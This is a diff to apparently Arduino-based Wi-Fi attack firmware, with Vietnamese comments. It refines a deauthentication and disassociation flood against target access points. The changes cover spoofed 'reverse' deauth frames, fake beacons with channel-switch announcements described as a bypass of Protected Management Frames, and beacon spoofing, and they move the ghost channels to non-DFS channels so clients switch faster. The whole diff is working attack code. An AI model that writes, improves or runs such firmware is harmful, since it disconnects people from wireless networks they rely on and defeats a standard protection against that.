@@ -557,7 +557,8 @@ void loop() {
     }
 
     static int last_ch = -1;
-    static const uint8_t csa_ghost_channels[] = {100, 120, 128, 140, 144, 165};
+    // FIX #5 (ino): Dùng non-DFS UNII-1/3 channels – client sẽ switch ngay
+    static const uint8_t csa_ghost_channels[] = {36, 40, 44, 48, 149, 153, 157, 161};
     static int csa_ghost_idx = 0;
 
     while (true) {
@@ -603,16 +604,17 @@ void loop() {
                             wifi_tx_deauth_nav(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
                             uint8_t ghost_ch = csa_ghost_channels[csa_ghost_idx % sizeof(csa_ghost_channels)];
                             
-                            // PMF Bypass: Fake Beacon with CSA/ECSA telling clients to switch to ghost_ch
+                            // PMF Bypass: Beacon-embedded CSA (Beacon không bị PMF bảo vệ)
                             wifi_tx_beacon_csa_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", scan_results[idx].ssid.c_str(), ghost_ch);
-                            
-                            wifi_tx_csa_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ghost_ch);
+                            wifi_tx_beacon_csa_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", scan_results[idx].ssid.c_str(), ghost_ch);
                             csa_ghost_idx++;
                             
                             wifi_tx_deauth_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
-                            wifi_tx_deauth_frame(rand_mac, bssid, reason);
+                            // FIX #1: Reverse Deauth – truyền bssid để access_point field đúng
+                            wifi_tx_deauth_frame(rand_mac, bssid, reason, bssid);
                             wifi_tx_disassoc_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
-                            wifi_tx_disassoc_frame(rand_mac, bssid, reason);
+                            // FIX #1: Reverse Disassoc
+                            wifi_tx_disassoc_frame(rand_mac, bssid, reason, bssid);
                             wifi_tx_null_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF");
                             wifi_tx_auth_frame(rand_mac, bssid);
                             // Beacon Spoofing to confuse roaming
@@ -626,8 +628,9 @@ void loop() {
                         } else {
                             wifi_tx_deauth_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
                             wifi_tx_disassoc_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason);
-                            wifi_tx_deauth_frame(rand_mac, bssid, reason);
-                            wifi_tx_disassoc_frame(rand_mac, bssid, reason);
+                            // FIX #1: Reverse Deauth/Disassoc 2.4GHz
+                            wifi_tx_deauth_frame(rand_mac, bssid, reason, bssid);
+                            wifi_tx_disassoc_frame(rand_mac, bssid, reason, bssid);
                             wifi_tx_null_frame(bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF");
                             wifi_tx_auth_frame(rand_mac, bssid);
                             // Beacon Spoofing to confuse roaming
